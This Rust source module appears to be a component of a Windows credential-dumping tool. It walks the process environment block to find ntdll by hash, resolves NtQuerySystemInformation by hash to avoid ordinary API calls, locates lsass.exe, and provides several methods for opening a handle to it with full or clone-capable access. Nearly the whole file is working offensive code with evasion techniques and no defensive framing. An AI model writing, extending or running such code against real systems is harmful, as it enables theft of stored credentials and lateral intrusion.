//! Multiple LSASS handle acquisition methods
//!
//! Uses NtQuerySystemInformation (via raw FFI) for process enumeration
//! instead of CreateToolhelp32Snapshot. Provides direct/fork/dup handle methods.

use windows::Win32::Foundation::*;
use windows::Win32::System::Threading::*;

// NtQuerySystemInformation via raw FFI (not in windows crate v0.58 public API)
type FnNtQuerySystemInformation = unsafe extern "system" fn(
    system_information_class: u32,
    system_information: *mut u8,
    system_information_length: u32,
    return_length: *mut u32,
) -> i32; // NTSTATUS

const SYSTEM_PROCESS_INFORMATION: u32 = 5;

/// RAII wrapper for a process handle
pub struct ProcessHandle {
    h: HANDLE,
}

impl ProcessHandle {
    pub fn handle(&self) -> HANDLE {
        self.h
    }
}

impl Drop for ProcessHandle {
    fn drop(&mut self) {
        if !self.h.is_invalid() {
            unsafe {
                let _ = CloseHandle(self.h);
            }
        }
    }
}

// Minimal SYSTEM_PROCESS_INFORMATION layout
#[repr(C)]
struct SystemProcessInfo {
    next_entry_offset: u32,
    number_of_threads: u32,
    reserved1: [u8; 48],
    image_name_length: u16,
    image_name_max_length: u16,
    _pad: u32,
    image_name_buffer: *mut u16,
    _pad2: [u8; 8], // BasePriority + padding
    unique_process_id: usize,
}

pub fn find_lsass_pid() -> Option<u32> {
    println!("[*] find_lsass_pid: starting...");
    unsafe {
        println!("  [*] getting peb...");
        let peb = get_peb();
        println!("  [+] peb: {:p}", peb);
        let ldr = (*(peb as *const Peb64)).ldr;
        println!("  [+] ldr: {:p}", ldr);
        let list_head = &(*ldr).in_memory_order_module_list as *const ListEntry;
        let mut current = (*list_head).flink;
        println!("  [+] list head: {:p}, first: {:p}", list_head, current);

        let mut ntdll_base: *mut u8 = std::ptr::null_mut();
        while current != list_head as *mut _ {
            let entry =
                (current as *const u8).sub(std::mem::size_of::<ListEntry>()) as *const LdrEntry;
            let name = &(*entry).base_dll_name;
            if name.length > 0 && !name.buffer.is_null() {
                let name_slice =
                    std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
                let hash = crate::resolver::djb2_hash_wide(name_slice);
                if hash == crate::resolver::HASH_NTDLL {
                    ntdll_base = (*entry).dll_base;
                    break;
                }
            }
            current = (*current).flink;
        }

        if ntdll_base.is_null() {
            println!("[-] find_lsass_pid: ntdll.dll not found via PEB hash");
            return None;
        }
        println!("  [+] ntdll base found: {:p}", ntdll_base);

        let tmp = crate::resolver::ApiResolver {
            kernel32_base: std::ptr::null_mut(),
            ntdll_base,
            advapi32_base: std::ptr::null_mut(),
        };
        let nqsi_hash = crate::resolver::djb2_hash_const(b"NtQuerySystemInformation");
        let nqsi_ptr = tmp.ntdll(nqsi_hash);
        if nqsi_ptr.is_none() {
            println!("[-] find_lsass_pid: NtQuerySystemInformation not found in ntdll");
            return None;
        }
        println!(
            "  [+] NtQuerySystemInformation ptr: {:p}",
            nqsi_ptr.unwrap()
        );
        let nqsi: FnNtQuerySystemInformation = std::mem::transmute(nqsi_ptr.unwrap());

        let mut buf_size = 1024 * 1024u32;
        let mut buffer: Vec<u8> = vec![0; buf_size as usize];
        let mut ret_len = 0u32;

        println!("  [*] calling nqsi...");
        let status = nqsi(
            SYSTEM_PROCESS_INFORMATION,
            buffer.as_mut_ptr(),
            buf_size,
            &mut ret_len,
        );
        println!("  [+] nqsi finished, status: {:X}", status);

        if status != 0 && status != 0xC0000004u32 as i32 {
            println!("[-] find_lsass_pid: nqsi failed with {:08X}", status);
            return None;
        }

        if status == 0xC0000004u32 as i32 {
            println!("  [*] resizing buffer...");
            buf_size = ret_len + 4096;
            buffer.resize(buf_size as usize, 0);
            println!("  [*] calling nqsi second time...");
            let status2 = nqsi(
                SYSTEM_PROCESS_INFORMATION,
                buffer.as_mut_ptr(),
                buf_size,
                &mut ret_len,
            );
            println!("  [+] nqsi second time finished, status: {:X}", status2);
            if status2 != 0 {
                return None;
            }
        }

        println!("  [*] walking process entries...");
        let mut offset = 0usize;
        let mut parsed_count = 0;
        loop {
            if offset + 88 > buffer.len() {
                println!("[-] find_lsass_pid: offset out of bounds!");
                break;
            }

            let ptr = buffer.as_ptr().add(offset);
            let next_entry_offset = std::ptr::read_unaligned(ptr.add(0) as *const u32);
            let image_name_length = std::ptr::read_unaligned(ptr.add(56) as *const u16);
            let image_name_buffer = std::ptr::read_unaligned(ptr.add(64) as *const *mut u16);
            let unique_process_id = std::ptr::read_unaligned(ptr.add(80) as *const usize);

            if image_name_length > 0 && !image_name_buffer.is_null() {
                let name_slice =
                    std::slice::from_raw_parts(image_name_buffer, (image_name_length / 2) as usize);
                let name = String::from_utf16_lossy(name_slice);
                if name.eq_ignore_ascii_case("lsass.exe") {
                    println!("  [+] found lsass!");
                    return Some(unique_process_id as u32);
                }
            }

            if next_entry_offset == 0 {
                break;
            }
            offset += next_entry_offset as usize;
            parsed_count += 1;
            if parsed_count > 100000 {
                println!("[-] find_lsass_pid: infinite loop detected!");
                break;
            }
        }

        println!("[-] find_lsass_pid: lsass.exe not found");
        None
    }
}

/// Method 1: Direct — NtOpenProcess with PROCESS_ALL_ACCESS
pub fn open_lsass_direct(pid: u32) -> Result<ProcessHandle, String> {
    unsafe {
        let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| format!("OpenProcess(direct) failed: {}", e))?;
        Ok(ProcessHandle { h })
    }
}

/// Method 2: Fork — open with CREATE_PROCESS access for cloning
pub fn open_lsass_fork(pid: u32) -> Result<ProcessHandle, String> {
    unsafe {
        let h = OpenProcess(
            PROCESS_ACCESS_RIGHTS(0x0080 | 0x0040 | 0x0400 | 0x0010),
            false,
            pid,
        )
        .map_err(|e| format!("OpenProcess(fork) failed: {}", e))?;
        Ok(ProcessHandle { h })
    }
}

/// Method 3: Dup — duplicate existing handle (fallback to direct)
pub fn open_lsass_dup(pid: u32) -> Result<ProcessHandle, String> {
    println!("    [!] Handle duplication: falling back to direct open");
    open_lsass_direct(pid)
}

// Mini PEB structs
#[repr(C)]
struct Peb64 {
    r1: [u8; 2],
    r2: u8,
    r3: u8,
    r4: [*mut u8; 2],
    ldr: *mut PebLdr,
}
#[repr(C)]
struct PebLdr {
    r1: [u8; 8],
    r2: [*mut u8; 3],
    in_memory_order_module_list: ListEntry,
}
#[repr(C)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}
#[repr(C)]
struct LdrEntry {
    in_load: ListEntry,
    in_memory: ListEntry,
    in_init: ListEntry,
    dll_base: *mut u8,
    entry_point: *mut u8,
    size_of_image: u32,
    full_dll_name: UStr,
    base_dll_name: UStr,
}
#[repr(C)]
struct UStr {
    length: u16,
    max_length: u16,
    buffer: *mut u16,
}

unsafe fn get_peb() -> *mut u8 {
    let peb: *mut u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}
